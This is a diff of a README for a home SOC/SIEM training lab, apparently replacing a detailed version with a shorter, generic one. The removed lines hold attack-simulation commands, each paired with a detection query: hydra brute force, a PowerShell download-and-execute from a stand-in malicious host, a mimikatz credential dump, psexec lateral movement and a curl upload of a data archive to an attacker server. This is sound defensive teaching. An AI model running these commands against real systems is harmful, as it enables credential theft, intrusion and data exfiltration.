@@ -1,691 +1,175 @@
-# Home SOC Lab with SIEM Deployment
+# Home SOC Lab with Ubuntu SIEM
+
+A hands-on home Security Operations Center (SOC) lab built with VirtualBox, using an Ubuntu-based SIEM to collect, correlate, and analyze security logs from multiple virtual machines. This project is designed to demonstrate SOC workflows such as log ingestion, alerting, and basic threat hunting in an isolated environment.
+
+---
 
 ## Table of Contents
 
-1. [Project Overview](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#project-overview)
-2. [Lab Architecture](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#lab-architecture)
-3. [Prerequisites](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#prerequisites)
-4. [Installation & Setup](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#installation--setup)
-5. [SIEM Configuration](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#siem-configuration)
-6. [Attack Scenarios](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#attack-scenarios)
-7. [Log Analysis](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#log-analysis)
-8. [Troubleshooting](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#troubleshooting)
-9. [References](https://claude.ai/chat/7d509a2c-ebdb-405a-bbe9-991bb0d599df#references)
+- [Overview](#overview)  
+- [Architecture](#architecture)  
+- [Lab Objectives](#lab-objectives)  
+- [Tech Stack](#tech-stack)  
+- [Setup and Installation](#setup-and-installation)  
+- [SIEM Configuration](#siem-configuration)  
+- [Generating and Analyzing Events](#generating-and-analyzing-events)  
+- [Repository Structure](#repository-structure)  
+- [Future Improvements](#future-improvements)  
+- [Disclaimer](#disclaimer)  
 
 ---
 
-## Project Overview
+## Overview
 
-### Purpose
+This project simulates a small SOC environment running entirely on a single host machine using Oracle VirtualBox.  
+An Ubuntu virtual machine hosts the SIEM platform, which collects logs from other virtual machines that represent endpoints and infrastructure components on a virtual network.
 
-This home Security Operations Center (SOC) lab provides a controlled environment for:
-
-- Learning SIEM deployment and configuration
-- Practicing log analysis and threat detection
-- Simulating real-world attack scenarios
-- Developing incident response skills
-
-### Goals
-
-- Deploy a fully functional SIEM solution
-- Configure comprehensive log collection from multiple sources
-- Generate and analyze security events
-- Document detection rules and playbooks
+You can adapt this lab to practice skills such as log analysis, detection engineering, threat hunting, and incident documentation.
 
 ---
 
-## Lab Architecture
+## Architecture
 
-### Network Diagram
+The lab is built around a VirtualBox virtual network that isolates all SOC components from the physical home network.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                    Host Machine                         │
-│                                                          │
-│  ┌────────────┐  ┌────────────┐  ┌──────────────┐     │
-│  │   SIEM     │  │  Windows   │  │    Linux     │     │
-│  │  Server    │  │   Client   │  │   Client     │     │
-│  │ (Splunk/   │  │            │  │              │     │
-│  │  ELK/      │  │            │  │              │     │
-│  │ Wazuh)     │  │            │  │              │     │
-│  └────────────┘  └────────────┘  └──────────────┘     │
-│        │               │                │              │
-│        └───────────────┴────────────────┘              │
-│                  Virtual Network                        │
-│                (/24)                       │
-└─────────────────────────────────────────────────────────┘
-```
+Core components:
+- **Host machine**: Your physical PC or laptop providing compute, RAM, and storage for all virtual machines.
+- **SIEM VM (Ubuntu)**: Central log collection and analysis server running your chosen SIEM stack.
+- **Endpoint VMs**: One or more Linux and/or Windows machines configured to forward logs to the SIEM.
+- **Optional infrastructure**: A virtual firewall/router VM and/or intentionally vulnerable targets for generating security-relevant events.
 
-### Components
-
-| Component             | Role                       | IP Address | OS            |
-| --------------------- | -------------------------- | ---------- | ------------- |
-| SIEM Server           | Log aggregation & analysis |            | Ubuntu 22.04  |
-| Windows Client        | Log source & attack target |            | Windows 10/11 |
-| Linux Client          | Log source & attack target |            | Ubuntu 22.04  |
-| Kali Linux (Optional) | Attack machine             |            | Kali Linux    |
+A diagram (recommended in your `/diagrams` folder) should show:
+- Network segments and IP addressing
+- Log and agent data flow into the SIEM
+- Management access paths (e.g., SSH/RDP/GUI to the SIEM and endpoints)
 
 ---
 
-## Prerequisites
+## Lab Objectives
 
-### Hardware Requirements
+This lab is intended to:
 
-- **CPU**: 4+ cores (8+ recommended)
-- **RAM**: 16GB minimum (32GB recommended)
-- **Storage**: 100GB+ free space
-- **Network**: Virtualization support (VT-x/AMD-V)
+- Recreate a small, realistic network where a SOC analyst can practice monitoring and investigation workflows.  
+- Configure a centralized SIEM on Ubuntu to ingest, normalize, and visualize logs from multiple sources.  
+- Build and test basic detection rules (for example, failed login bursts or suspicious process execution).  
+- Document at least one end-to-end incident investigation from event generation to final conclusion.
 
-### Software Requirements
-
-- **Hypervisor**: VMware Workstation, VirtualBox, or Hyper-V
-- **Operating Systems**:
-    - Ubuntu Server 22.04 ISO
-    - Windows 10/11 ISO
-    - Kali Linux ISO (optional)
-
-### Knowledge Prerequisites
-
-- Basic Linux command line
-- Understanding of networking concepts
-- Familiarity with virtualization
+These objectives make the project suitable for a portfolio, resume, or interview discussion.
 
 ---
 
-## Installation & Setup
+## Tech Stack
 
-### Step 1: Hypervisor Setup
+You can adjust tools to your preference; below is the general stack this lab assumes:
 
-#### VirtualBox Installation
+- **Virtualization**
+  - Oracle VirtualBox for hosting and networking all lab virtual machines.
 
-```bash
-# Ubuntu/Debian
-sudo apt update
-sudo apt install virtualbox virtualbox-ext-pack
+- **Operating Systems**
+  - Ubuntu (server or desktop) as the SIEM host.
+  - One or more additional Linux and/or Windows VMs as endpoints.
 
-# macOS
-brew install --cask virtualbox
-```
+- **SIEM Platform**
+  - An Ubuntu-based SIEM stack (for example: Wazuh, ELK/Elastic Stack, Graylog, or similar open-source tooling).
 
-#### VMware Workstation (Alternative)
+- **Agents and Logging Tools**
+  - OS-level logging (e.g., syslog on Linux, event logs on Windows).
+  - Endpoint agents/log shippers (e.g., Wazuh agents, Beats, or other supported agents for your SIEM).
+  - Optional: Enhanced logging such as Sysmon on Windows or auditd on Linux.
 
-Download from VMware website and follow installation wizard.
+---
 
-### Step 2: Network Configuration
+## Setup and Installation
 
-#### Create Virtual Network
+This section explains how someone else can recreate the environment on their own machine.
 
-1. Open your hypervisor's network settings
-2. Create a new NAT or Host-Only network
-3. Configure subnet: `192.168.100.0/24`
-4. Enable DHCP (optional) or use static IPs
+### Prerequisites
 
-**VirtualBox Example:**
+- Hardware capable of running multiple VMs (recommended: multi-core CPU, 16 GB+ RAM, and sufficient disk space).  
+- Virtualization enabled in BIOS/UEFI.  
+- Oracle VirtualBox installed on the host system.  
+- ISO images for Ubuntu and any additional operating systems used as endpoints.
 
-```bash
-VBoxManage natnetwork add --netname SOCLabNet --network "192.168.100.0/24" --enable
-```
+### Step 1: Create the Virtual Network
 
-### Step 3: SIEM Server Deployment
+- Define one or more internal or host-only networks in VirtualBox for the SOC lab.  
+- Decide on IP ranges and basic addressing for each VM.  
+- Optionally add a NAT adapter for controlled outbound internet access if required for updates or package installation.
 
-#### Option A: Splunk Enterprise (Free License)
+### Step 2: Build the SIEM VM (Ubuntu)
 
-**VM Specifications:**
+- Create a new VM in VirtualBox and install Ubuntu as the SIEM host.  
+- Assign a static IP address within the lab network.  
+- Apply basic hardening measures (update packages, configure a non-root user, enable firewall rules as appropriate).  
+- Install and configure your chosen SIEM stack:
+  - Core services (e.g., Elasticsearch, database, or equivalent back end).
+  - Web interface and management console.
+  - Any bundled agents or managers required for endpoint integration.
 
-- 4 vCPUs
-- 8GB RAM
-- 50GB storage
+### Step 3: Build Endpoint VMs
 
-**Installation Steps:**
-
-```bash
-# 1. Download Splunk
-wget -O splunk.tgz 'https://download.splunk.com/products/splunk/releases/[VERSION]/linux/splunk-[VERSION]-Linux-x86_64.tgz'
-
-# 2. Extract and install
-sudo tar xvzf splunk.tgz -C /opt/
-
-# 3. Start Splunk
-sudo /opt/splunk/bin/splunk start --accept-license
-
-# 4. Enable boot-start
-sudo /opt/splunk/bin/splunk enable boot-start
-```
-
-**Access:** `http://192.168.100.10:8000` **Default credentials:** admin / changeme (change on first login)
-
-#### Option B: Elastic Stack (ELK)
-
-**Installation Steps:**
-
-```bash
-# 1. Install Elasticsearch
-wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg
-echo "deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
-sudo apt update && sudo apt install elasticsearch
-
-# 2. Install Kibana
-sudo apt install kibana
-
-# 3. Install Logstash
-sudo apt install logstash
-
-# 4. Start services
-sudo systemctl enable elasticsearch kibana logstash
-sudo systemctl start elasticsearch kibana logstash
-```
-
-**Access:** `http://192.168.100.10:5601`
-
-#### Option C: Wazuh
-
-**Installation Steps:**
-
-```bash
-# Quick installation
-curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
-sudo bash ./wazuh-install.sh -a
-```
-
-**Access:** `https://192.168.100.10`
-
-### Step 4: Windows Client Setup
-
-1. Create Windows 10/11 VM
-    
-    - 2 vCPUs, 4GB RAM, 50GB storage
-    - Connect to SOCLabNet network
-2. Configure static IP:
-    
-    ```powershell
-    New-NetIPAddress -IPAddress 192.168.100.20 -PrefixLength 24 -DefaultGateway 192.168.100.1 -InterfaceAlias "Ethernet"
-    ```
-    
-3. Install Sysmon for enhanced logging:
-    
-    ```powershell
-    # Download Sysmon
-    Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "Sysmon.zip"
-    Expand-Archive Sysmon.zip
-    
-    # Download SwiftOnSecurity config
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "sysmonconfig.xml"
-    
-    # Install with config
-    .\Sysmon64.exe -accepteula -i sysmonconfig.xml
-    ```
-    
-
-### Step 5: Linux Client Setup
-
-1. Create Ubuntu 22.04 VM
-    
-    - 2 vCPUs, 2GB RAM, 25GB storage
-2. Configure static IP:
-    
-    ```bash
-    sudo nano /etc/netplan/00-installer-config.yaml
-    ```
-    
-    ```yaml
-    network:
-      ethernets:
-        ens33:
-          addresses:
-            - 192.168.100.30/24
-          gateway4: 192.168.100.1
-          nameservers:
-            addresses: [8.8.8.8, 8.8.4.4]
-      version: 2
-    ```
-    
-    ```bash
-    sudo netplan apply
-    ```
-    
-3. Install auditd for system auditing:
-    
-    ```bash
-    sudo apt update
-    sudo apt install auditd audispd-plugins
-    sudo systemctl enable auditd
-    sudo systemctl start auditd
-    ```
-    
+- Create one or more additional VMs (Linux/Windows) to act as monitored endpoints.  
+- Join each endpoint to the same VirtualBox network as the SIEM.  
+- Configure basic system logging and time synchronization.
 
 ---
 
 ## SIEM Configuration
 
-### Log Collection Setup
+This section documents how logs get from endpoints into your SIEM.
 
-#### For Splunk
+Key configuration tasks:
 
-**Windows Universal Forwarder:**
+- **Agent/forwarder installation**  
+  - Install SIEM agents or log shippers on each endpoint.  
+  - Point them to the SIEM VM’s IP/hostname and relevant port(s).
 
-```powershell
-# Install Universal Forwarder on Windows client
-msiexec.exe /i splunkforwarder.msi DEPLOYMENT_SERVER="192.168.100.10:8089" AGREETOLICENSE=Yes /quiet
+- **Log sources and pipelines**  
+  - Define data sources or inputs in the SIEM (e.g., syslog, Windows event logs, security logs).  
+  - Configure pipelines, index patterns, or streams so logs are parsed and stored correctly.
 
-# Configure inputs
-$InputsConf = @"
-[WinEventLog://Security]
-disabled = 0
-renderXml = true
+- **Dashboards and visualizations**  
+  - Create or customize dashboards to monitor authentication activity, process creation, network events, or security alerts.  
+  - Include screenshots in the `/docs` folder to show key dashboards.
 
-[WinEventLog://System]
-disabled = 0
-
-[WinEventLog://Application]
-disabled = 0
-
-[WinEventLog://Microsoft-Windows-Sysmon/Operational]
-disabled = 0
-renderXml = true
-"@
-
-$InputsConf | Out-File "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
-```
-
-**Linux Universal Forwarder:**
-
-```bash
-# Install forwarder
-wget -O splunkforwarder.tgz 'https://download.splunk.com/products/universalforwarder/releases/[VERSION]/linux/splunkforwarder-[VERSION]-Linux-x86_64.tgz'
-sudo tar xvzf splunkforwarder.tgz -C /opt/
-
-# Start and configure
-sudo /opt/splunkforwarder/bin/splunk start --accept-license
-sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.100.10:9997
-sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log
-sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/syslog
-```
-
-#### For ELK Stack
-
-**Filebeat on Windows:**
-
-```powershell
-# Download and install Filebeat
-# Configure filebeat.yml
-@"
-filebeat.inputs:
-- type: winlogbeat
-  enabled: true
-  event_logs:
-    - name: Security
-    - name: System
-    - name: Application
-    - name: Microsoft-Windows-Sysmon/Operational
-
-output.elasticsearch:
-  hosts: ["192.168.100.10:9200"]
-  
-setup.kibana:
-  host: "192.168.100.10:5601"
-"@ | Out-File "C:\Program Files\Filebeat\filebeat.yml"
-```
-
-**Filebeat on Linux:**
-
-```bash
-sudo apt install filebeat
-
-# Configure
-sudo nano /etc/filebeat/filebeat.yml
-```
-
-```yaml
-filebeat.inputs:
-- type: log
-  enabled: true
-  paths:
-    - /var/log/auth.log
-    - /var/log/syslog
-    - /var/log/audit/audit.log
-
-output.elasticsearch:
-  hosts: ["192.168.100.10:9200"]
-
-setup.kibana:
-  host: "192.168.100.10:5601"
-```
-
-```bash
-sudo systemctl enable filebeat
-sudo systemctl start filebeat
-```
-
-### Creating Detection Rules
-
-#### Splunk Detection Examples
-
-**Failed Login Attempts:**
-
-```spl
-index=windows EventCode=4625
-| stats count by Account_Name, src_ip
-| where count > 5
-```
-
-**Suspicious Process Creation:**
-
-```spl
-index=sysmon EventCode=1
-| search (Image="*\\powershell.exe" OR Image="*\\cmd.exe")
-  (CommandLine="*-enc*" OR CommandLine="*IEX*" OR CommandLine="*DownloadString*")
-```
-
-#### ELK Detection Examples
-
-**Failed SSH Logins:**
-
-```json
-{
-  "query": {
-    "bool": {
-      "must": [
-        { "match": { "event.action": "ssh_login" }},
-        { "match": { "event.outcome": "failure" }}
-      ]
-    }
-  },
-  "aggs": {
-    "by_source": {
-      "terms": { "field": "source.ip" }
-    }
-  }
-}
-```
+- **Alerting and detection rules**  
+  - Implement a small set of detection rules, such as:
+    - Multiple failed logons in a short window.  
+    - New administrative account creation.  
+    - Unusual process executions or services.
 
 ---
 
-## Attack Scenarios
+## Generating and Analyzing Events
 
-### Scenario 1: Brute Force Attack
+To demonstrate the lab, this section walks through how to create activity and then investigate it.
 
-**Objective:** Detect SSH/RDP brute force attempts
+Example exercises:
 
-**Execution:**
+- **Authentication scenarios**
+  - Perform normal logins and logouts on endpoints.  
+  - Intentionally generate failed logins or simple brute-force attempts to trigger alerts.
 
-```bash
-# From Kali Linux or another system
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.30
+- **Reconnaissance and scanning**
+  - Run a basic port scan from one VM to another and observe resulting events in the SIEM.
 
-# For RDP
-hydra -l administrator -P passwords.txt rdp://192.168.100.20
-```
+- **Process and malware simulation**
+  - Execute benign tools that resemble suspicious behavior (e.g., scripting tools, admin utilities).  
+  - Analyze how these events appear in logs and dashboards.
 
-**Expected Logs:**
+For at least one scenario, document:
 
-- Multiple failed authentication events (EventID 4625 on Windows)
-- Multiple failed SSH attempts in /var/log/auth.log on Linux
+1. How the activity was generated.  
+2. Which logs appeared in the SIEM.  
+3. Any alerts that were triggered.  
+4. The investigation steps (queries, filters, pivoting across data).  
+5. The final assessment and recommended response.
 
-**Detection Query (Splunk):**
-
-```spl
-index=* (EventCode=4625 OR "Failed password")
-| stats count by src_ip, user
-| where count > 10
-```
-
-### Scenario 2: Malicious PowerShell Execution
-
-**Objective:** Detect obfuscated or encoded PowerShell commands
-
-**Execution:**
-
-```powershell
-# On Windows client, execute encoded command
-powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
-
-# Download and execute
-powershell.exe -command "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload')"
-```
-
-**Expected Logs:**
-
-- Sysmon EventID 1 (Process Creation)
-- PowerShell Operational logs (EventID 4104)
-
-**Detection Query:**
-
-```spl
-index=sysmon EventCode=1 Image="*powershell.exe"
-(CommandLine="*-enc*" OR CommandLine="*-e *" OR CommandLine="*IEX*" OR CommandLine="*DownloadString*")
-```
-
-### Scenario 3: Privilege Escalation
-
-**Objective:** Detect attempts to escalate privileges
-
-**Execution (Linux):**
-
-```bash
-# Attempt to exploit sudo
-sudo -l
-sudo su -
-
-# Check for SUID binaries
-find / -perm -4000 2>/dev/null
-```
-
-**Execution (Windows):**
-
-```powershell
-# Check privileges
-whoami /priv
-
-# Attempt to access LSASS
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
-```
-
-**Detection Query:**
-
-```spl
-index=* (EventCode=4672 OR "sudo:" OR "COMMAND=su")
-| stats count by user, src_host
-```
-
-### Scenario 4: Lateral Movement
-
-**Objective:** Detect lateral movement attempts
-
-**Execution:**
-
-```bash
-# SMB enumeration
-crackmapexec smb 192.168.100.0/24
-
-# PSExec usage
-psexec.py domain/user:password@192.168.100.20
-
-# WMI execution
-wmiexec.py domain/user:password@192.168.100.20
-```
-
-**Expected Logs:**
-
-- EventID 4688 (Process Creation)
-- EventID 4624 (Logon Type 3)
-- Network connection logs
-
-**Detection Query:**
-
-```spl
-index=windows EventCode=4688
-(NewProcessName="*psexec*" OR NewProcessName="*wmic.exe*")
-| table _time, Computer, User, NewProcessName, CommandLine
-```
-
-### Scenario 5: Data Exfiltration
-
-**Objective:** Detect unusual outbound data transfers
-
-**Execution:**
-
-```bash
-# Large file upload simulation
-curl -X POST -F "file=@sensitive_data.zip" http://attacker-server.com/upload
-
-# DNS tunneling simulation
-dnscat2
-```
-
-**Expected Logs:**
-
-- Large outbound network connections
-- Unusual DNS queries
-- Process network activity
-
-**Detection Query:**
-
-```spl
-index=* sourcetype=firewall
-| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
-| where total_bytes > 100000000
-```
+This incident-style write-up is valuable for interviews and portfolio reviews.
 
 ---
 
-## Log Analysis
+## Repository Structure
 
-### Key Event IDs to Monitor
+A suggested structure for this project:
 
-#### Windows Security Events
-
-|Event ID|Description|Severity|
-|---|---|---|
-|4624|Successful logon|Info|
-|4625|Failed logon|Warning|
-|4672|Special privileges assigned|High|
-|4688|Process creation|Info|
-|4697|Service installed|High|
-|4720|User account created|Medium|
-|4728|Member added to security group|High|
-
-#### Sysmon Events
-
-|Event ID|Description|Use Case|
-|---|---|---|
-|1|Process creation|Malware execution|
-|3|Network connection|C2 communication|
-|7|Image loaded|DLL injection|
-|10|Process access|Credential dumping|
-|11|File created|Ransomware activity|
-
-#### Linux Auth Logs
-
-- Failed sudo attempts
-- SSH key authentication failures
-- User additions/modifications
-- Privilege escalation events
-
-### Analysis Workflow
-
-1. **Baseline Normal Activity**
-    
-    - Document typical user behavior
-    - Identify normal process executions
-    - Map regular network connections
-2. **Create Correlation Rules**
-    
-    - Multiple failed logins followed by success
-    - Unusual process parent-child relationships
-    - Rare commands executed by common users
-3. **Set Up Alerts**
-    
-    - Real-time notifications for high-severity events
-    - Daily reports for medium-severity events
-    - Weekly reviews of all detected anomalies
-4. **Incident Response Process**
-    
-    ```
-    Detection → Triage → Analysis → Containment → Eradication → Recovery → Lessons Learned
-    ```
-    
-
----
-
-## Troubleshooting
-
-### Common Issues
-
-**Forwarders Not Sending Data:**
-
-```bash
-# Check forwarder status (Splunk)
-/opt/splunkforwarder/bin/splunk list forward-server
-
-# Check connection
-telnet 192.168.100.10 9997
-
-# Review logs
-tail -f /opt/splunkforwarder/var/log/splunk/splunkd.log
-```
-
-**High Resource Usage:**
-
-- Reduce log retention period
-- Filter unnecessary logs at source
-- Increase SIEM server resources
-
-**Missing Events:**
-
-- Verify forwarder configuration
-- Check firewall rules between systems
-- Ensure proper time synchronization (NTP)
-
-**Network Connectivity Issues:**
-
-```bash
-# Test connectivity
-ping 192.168.100.10
-
-# Check routing
-ip route
-
-# Verify firewall rules
-sudo ufw status
-```
-
----
-
-## References
-
-### Documentation
-
-- [Splunk Documentation](https://docs.splunk.com/)
-- [Elastic Stack Documentation](https://www.elastic.co/guide/)
-- [Wazuh Documentation](https://documentation.wazuh.com/)
-- [Sysmon Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
-
-### Attack Frameworks
-
-- [MITRE ATT&CK](https://attack.mitre.org/)
-- [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
-
-### Learning Resources
-
-- [SANS Reading Room](https://www.sans.org/reading-room/)
-- [Splunk Security Essentials](https://splunkbase.splunk.com/app/3435/)
-- [Blue Team Labs Online](https://blueteamlabs.online/)
-
----
-
-## Contributing
-
-Contributions are welcome! Please submit pull requests with:
-
-- New attack scenarios
-- Improved detection rules
-- Additional SIEM configurations
-- Documentation improvements
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Acknowledgments
-
-Special thanks to the cybersecurity community for sharing knowledge and tools that make projects like this possible.
